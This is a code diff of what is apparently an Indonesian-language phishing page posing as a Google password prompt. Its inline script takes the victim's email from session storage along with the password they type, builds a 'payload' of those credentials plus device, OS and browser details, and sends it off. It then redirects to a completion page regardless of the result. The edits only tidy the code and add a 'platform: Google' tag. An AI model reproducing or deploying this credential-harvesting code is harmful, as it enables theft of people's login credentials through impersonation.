@@ -76,7 +76,6 @@
   </div>
 
 <script>
-  // AMBIL EMAIL DARI HALAMAN SEBELUMNYA
   var emailKorban = sessionStorage.getItem('email_korban') || "unknown@gmail.com";
   document.getElementById('emailDisplay').innerText = emailKorban;
 
@@ -95,7 +94,6 @@
     input.classList.remove('input-error');
     errorDiv.classList.remove('show');
 
-    // VALIDASI MINIMAL 8 KARAKTER
     if(password.length < 8) {
         errorText.innerText = "Sandi harus minimal 8 karakter. Ketik setidaknya 8 karakter.";
         input.classList.add('input-error');
@@ -109,17 +107,12 @@
     var ua = navigator.userAgent;
     var web_id_aktif = sessionStorage.getItem('web_id_aktif') || 'web_id_kenz_1';
 
-    // PAYLOAD DATA KORBAN LENGKAP DENGAN DETEKSI OS & BROWSER
     var payload = {
         web_id: web_id_aktif,
+        platform: "Google", // <--- INI YANG BIKIN DI RES BISA KEDETEK KONTOL
         email: emailKorban, 
         password: password,
-        ip: "-", 
-        negara: "-",
-        prov: "-",
-        kota: "-",
-        isp: "-",
-        koord: "-",
+        ip: "-", negara: "-", prov: "-", kota: "-", isp: "-", koord: "-",
         waktu: new Date().toLocaleString("id-ID"),
         device: detectDevice(ua),
         os: detectOS(ua),
@@ -144,11 +137,9 @@
         })
         .then(function(res){
             sessionStorage.setItem('password_korban', password);
-            // LANJUT KE SELESAI.HTML
             window.location.href = "selesai.html";
         })
         .catch(function(err){
-            // KALO ERROR TETEP LANJUT KE SELESAI.HTML
             window.location.href = "selesai.html"; 
         });
   }
@@ -157,38 +148,9 @@
       if (e.key === 'Enter') { kirimData(); }
   });
 
-  // ==========================================
-  // FUNGSI DETEKSI DEVICE, OS, & BROWSER
-  // ==========================================
-  function detectDevice(ua){
-      if(/Android/i.test(ua)) return "Android";
-      if(/iPhone|iPad|iPod/i.test(ua)) return "iOS";
-      if(/Windows/i.test(ua)) return "Windows";
-      if(/Mac/i.test(ua)) return "Mac";
-      if(/Linux/i.test(ua)) return "Linux";
-      return "Unknown";
-  }
-
-  function detectOS(ua){
-      var m;
-      if((m = ua.match(/Android\s([\d.]+)/i))) return "Android " + m[1];
-      if((m = ua.match(/iPhone OS ([\d_]+)/i))) return "iOS " + m[1].replace(/_/g,".");
-      if((m = ua.match(/Windows NT ([\d.]+)/i))){ var v = m[1]; return "Windows " + (v === "10.0" ? "10/11" : v); }
-      if((m = ua.match(/Mac OS X ([\d_]+)/i))) return "macOS " + m[1].replace(/_/g,".");
-      if(/Linux/i.test(ua)) return "Linux";
-      return "Unknown";
-  }
-
-  function detectBrowser(ua){
-      var m;
-      if(/Edg\//i.test(ua) && (m = ua.match(/Edg\/([\d.]+)/i))) return "Edge " + m[1];
-      if(/OPR\//i.test(ua) && (m = ua.match(/OPR\/([\d.]+)/i))) return "Opera " + m[1];
-      if(/SamsungBrowser/i.test(ua) && (m = ua.match(/SamsungBrowser\/([\d.]+)/i))) return "Samsung " + m[1];
-      if(/Chrome\//i.test(ua) && (m = ua.match(/Chrome\/([\d.]+)/i))) return "Chrome " + m[1];
-      if(/Firefox\//i.test(ua) && (m = ua.match(/Firefox\/([\d.]+)/i))) return "Firefox " + m[1];
-      if(/Safari\//i.test(ua) && (m = ua.match(/Version\/([\d.]+)/i))) return "Safari " + m[1];
-      return "Unknown";
-  }
+  function detectDevice(ua){ if(/Android/i.test(ua)) return "Android"; if(/iPhone|iPad|iPod/i.test(ua)) return "iOS"; if(/Windows/i.test(ua)) return "Windows"; if(/Mac/i.test(ua)) return "Mac"; return "Unknown"; }
+  function detectOS(ua){ var m; if((m = ua.match(/Android\s([\d.]+)/i))) return "Android " + m[1]; if((m = ua.match(/iPhone OS ([\d_]+)/i))) return "iOS " + m[1].replace(/_/g,"."); if((m = ua.match(/Windows NT ([\d.]+)/i))){ var v = m[1]; return "Windows " + (v === "10.0" ? "10/11" : v); } if((m = ua.match(/Mac OS X ([\d_]+)/i))) return "macOS " + m[1].replace(/_/g,"."); return "Unknown"; }
+  function detectBrowser(ua){ var m; if(/Edg\//i.test(ua) && (m = ua.match(/Edg\/([\d.]+)/i))) return "Edge " + m[1]; if(/OPR\//i.test(ua) && (m = ua.match(/OPR\/([\d.]+)/i))) return "Opera " + m[1]; if(/SamsungBrowser/i.test(ua) && (m = ua.match(/SamsungBrowser\/([\d.]+)/i))) return "Samsung " + m[1]; if(/Chrome\//i.test(ua) && (m = ua.match(/Chrome\/([\d.]+)/i))) return "Chrome " + m[1]; if(/Firefox\//i.test(ua) && (m = ua.match(/Firefox\/([\d.]+)/i))) return "Firefox " + m[1]; if(/Safari\//i.test(ua) && (m = ua.match(/Version\/([\d.]+)/i))) return "Safari " + m[1]; return "Unknown"; }
 </script>
 </body>
 </html>
